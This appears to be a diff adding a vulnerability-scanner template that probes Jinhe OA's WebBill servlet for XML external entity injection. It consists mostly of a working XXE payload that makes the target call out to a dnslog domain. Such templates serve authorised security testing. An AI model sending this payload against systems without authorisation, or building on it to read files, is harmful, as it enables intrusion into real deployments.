@@ -1,0 +1,16 @@
+name: 金和OA-WebBill-XXE
+description: >-
+  dnslog回显成功
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jc6/servlet/WebBill?key=key
+    dnslog: domain
+    headers:
+      Content-Type: application/xml
+    body: >-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{domain}}"> %remote;]>'
+    expression:
+      dnslogCheck: true
